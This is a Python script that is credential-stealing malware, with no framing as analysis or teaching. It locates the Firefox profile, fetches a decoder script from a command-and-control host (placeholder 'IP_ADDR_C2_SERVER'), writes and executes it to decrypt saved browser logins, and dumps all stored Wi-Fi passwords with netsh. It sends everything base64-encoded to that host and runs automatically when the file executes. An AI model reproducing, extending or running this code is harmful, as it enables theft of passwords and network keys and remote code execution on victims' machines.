import socket
import os
from pathlib import Path
import time
import base64
import tempfile
import subprocess
import re

username = os.getenv("USERNAME")

profiles_path = Path(f"C:/Users/{username}/AppData/Roaming/Mozilla/Firefox/Profiles")
temp_dir = tempfile.gettempdir()

def get_credentials_paths()-> str:
    if not profiles_path.exists() : return "Error"
    for profile_dir in profiles_path.iterdir():
        if profile_dir.is_dir():
            key_path = profile_dir / 'key4.db'
            if key_path.exists() : return profile_dir
    return "Error"

def connect_server(host: str, port: int) -> socket:
    s = socket.socket()
    try :
        s.connect((host, port))
    except :
        time.sleep(100)
        connect_server(host, port)
    return s

def send_data(s: socket, data: str) -> None:
    data_encoded = base64.b64encode(data)
    separateur = "\n"
    s.sendall(data_encoded)
    s.send(separateur.encode('utf-8'))

def recv_data(sock: socket):
    buffer =  b''
    while True:
        data = sock.recv(1)
        if data == b'\n':
            return buffer
        buffer+= data

def write_file(data: bytes, file_name: str) -> None :
    decoded_data = base64.b64decode(data)
    with open(file_name, 'wb') as f :
        f.write(decoded_data)

def decode_login(path: str, firefox_decoder: bytes) -> str:
    file_name = os.path.join(temp_dir, 'abcd')
    data_name = os.path.join(temp_dir, 'efgh')
    write_file(firefox_decoder, file_name)
    command = f'python {file_name} --format csv {path} > {data_name}'
    os.system(command)
    with open(data_name, 'rb') as f :
        data = f.read()
    os.remove(file_name)
    os.remove(data_name)

    return data

def get_wifi() -> str:
    wifi_profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode('cp850')
    wifi_profiles = wifi_profiles.replace('\r', '')
    wifi_names = re.findall(r"All User Profile\s*: (.*)", wifi_profiles)
    wifi_credentials = ""
    for name in wifi_names:
        wifi_info = subprocess.check_output(f"netsh wlan show profile \"{name}\" key=clear", shell=True).decode('cp850')
        password = re.search(r"Key Content\s*:\s*(.*)", wifi_info)
        if password :
            wifi_credentials += f'{name}:{password.group(1).replace('\r', '')}\n'
    return wifi_credentials.encode('utf-8')

def get_credentials() -> None:
    host = 'IP_ADDR_C2_SERVER'
    port = 12345
    path = get_credentials_paths()
    if path == "Error" :
        s = connect_server(host, port)
        data_error = "Error: firefox profile no found\n"
        send_data(s, data_error.encode("utf-8"))
        s.close()
        return
    s = connect_server(host, port)
    firefox_decoder = recv_data(s)
    credentials = decode_login(path, firefox_decoder)
    send_data(s, credentials)
    wifi = get_wifi()
    send_data(s, wifi)
    s.close()

get_credentials()
